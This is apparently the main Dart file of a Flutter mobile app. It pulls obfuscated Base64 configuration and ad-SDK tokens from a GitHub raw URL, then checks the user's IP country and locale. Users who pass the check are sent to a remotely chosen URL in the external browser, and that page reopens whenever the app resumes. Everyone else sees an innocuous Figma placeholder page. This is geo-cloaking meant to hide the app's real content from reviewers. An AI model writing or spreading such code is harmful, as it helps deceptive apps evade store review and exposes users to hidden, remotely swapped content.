import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'dart:ui' as ui;
import 'package:webview_flutter/webview_flutter.dart';
import 'package:all_in_one_sdk/all_in_one_sdk.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initAllInOneSdk();
  runApp(MaterialApp(debugShowCheckedModeBanner: false, home: SplashScreen()));
}

Future<void> initAllInOneSdk() async {
  try {
    final info = await PackageInfo.fromPlatform();
    print('Package name: ${info.packageName}');

    final url =
        'https://raw.githubusercontent.com/codewithlane/helloworld/refs/heads/main/${info.packageName}/sdk.json';

    final response = await http.get(Uri.parse(url));

    if (response.statusCode != 200) {
      debugPrint('SDK config load failed');
      return;
    }

    final data = jsonDecode(response.body);

    final firebase = data['firebase'];
    final facebook = data['facebook'];
    final tiktok = data['tiktok'];

    await SdkBootstrap.apply(
      firebase: FirebaseDynamicConfig(
        apiKey: firebase['apiKey'] ?? '',
        gcmSenderId: firebase['gcmSenderId'] ?? '',
        bundleId: firebase['bundleId'] ?? '',
        projectId: firebase['projectId'] ?? '',
        storageBucket: firebase['storageBucket'] ?? '',
        googleAppId: firebase['googleAppId'] ?? '',
        androidGoogleAppId: firebase['androidGoogleAppId'] ?? '',
        isAnalyticsEnabled: firebase['isAnalyticsEnabled'] ?? true,
      ),
      facebook: FacebookSdkConfig(
        applicationId: facebook['applicationId'] ?? '',
        clientToken: facebook['clientToken'] ?? '',
        displayName: facebook['displayName'] ?? '',
        autoLogAppEventsEnabled: facebook['autoLogAppEventsEnabled'] ?? true,
        advertiserIdCollectionEnabled:
            facebook['advertiserIdCollectionEnabled'] ?? true,
      ),
      tiktok: TikTokSdkConfig(
        tiktokAppId: tiktok['tiktokAppId'] ?? '',
        appId: tiktok['appId'] ?? '',
        accessToken: tiktok['accessToken'] ?? '',
        debugModeEnabled: false,
      ),
    );

    debugPrint('SDK initialized successfully');
  } catch (e) {
    debugPrint('Init SDK error: $e');
  }
}

class SplashScreen extends StatefulWidget {
  SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  static String defaultUri = "https://olive-deer-68536647.figma.site";
  String? uri;
  String configLink = "";

  @override
  void initState() {
    super.initState();
    checkInternetAndNavigate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,

        child: Center(child: CircularProgressIndicator(color: Colors.green)),
      ),
    );
  }

  Future<void> checkInternetAndNavigate() async {
    final info = await PackageInfo.fromPlatform();
    configLink =
        "https://raw.githubusercontent.com/codewithlane/helloworld/refs/heads/main/${info.packageName}/ios.ini";
    print("config link: " + configLink);
    bool online = await hasInternet();

    if (online) {
      loadConfigAndNavigate();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          backgroundColor: Colors.red,
          content: Text(
            "No Internet!",
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
        ),
      );
    }
  }

  Future<bool> hasInternet() async {
    // try {
    //   final result = await InternetAddress.lookup('google.com');
    //   if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
    //     return true; // Có Internet
    //   }
    //   return false;
    // } on SocketException catch (_) {
    //   return false; // Không có Internet
    // }

    return true;
  }

  void loadConfigAndNavigate() async {
    try {
      // B1: Fetch Base64 config
      final res = await http.get(Uri.parse(configLink));
      if (res.statusCode != 200) throw Exception("Config fetch failed");

      // B2: Decode Base64 → UTF-8
      final decodedData = utf8.decode(base64Decode(cleanBase64(res.body)));

      // B3: Parse JSON
      final jsonData = json.decode(decodedData);

      final String linkReal = jsonData["linkReal"] ?? "";
      final String ip = jsonData["ip"] ?? "";

      //check region

      final locale = ui.PlatformDispatcher.instance.locale;
      print("Region: " + locale.countryCode!.toUpperCase());

      final checkRegionRes = await http.get(
        Uri.parse("http://ip-api.com/json/"),
      );
      final data = jsonDecode(checkRegionRes.body);
      print("network ip: " + data["countryCode"]);
      print("condition: IP=" + ip);

      if (ip == "" ||
          ip.contains(data["countryCode"]) ||
          ip.contains(locale.countryCode!.toUpperCase())) {
        print("Passed IP");

        uri = linkReal;
        //SAVE STATUS
        final SharedPreferences prefs = await SharedPreferences.getInstance();
        await prefs.setBool('Passed', true);
      } else {
        print("Not Passed IP, check session...");

        // GET STATUS
        final SharedPreferences prefs = await SharedPreferences.getInstance();
        bool? stt = await prefs.getBool('Passed');
        if (stt != null && stt) {
          print("Passed");
          uri = linkReal;
        } else {
          print("Not Passed");
          uri = defaultUri;
        }
      }

      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: uri!)),
      );
    } catch (e) {
      print("Error: $e");
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => HomeScreen(uri: defaultUri)),
      );
    }
  }

  String cleanBase64(String input) {
    String cleaned = input.replaceAll("\n", "").replaceAll("\r", "").trim();
    while (cleaned.length % 4 != 0) {
      cleaned += "=";
    }
    return cleaned;
  }
}

class HomeScreen extends StatefulWidget {
  String uri;

  HomeScreen({super.key, required this.uri});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
  String get uri => widget.uri;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    // mở URL lần đầu
    WidgetsBinding.instance.addPostFrameCallback((_) => _launchUrl());
  }

  Future<void> _launchUrl() async {
    if (!widget.uri.contains("figma")) {
      final Uri url = Uri.parse(widget.uri);
      if (!await launchUrl(url)) {
        throw 'Could not launch $url';
      }
    }
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      // app quay lại foreground → tự mở lại URL
      _launchUrl();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: uri.contains("figma")
            ? InAppWebView(initialUrlRequest: URLRequest(url: WebUri(uri)))
            : Container(),
      ),
    );
  }
}
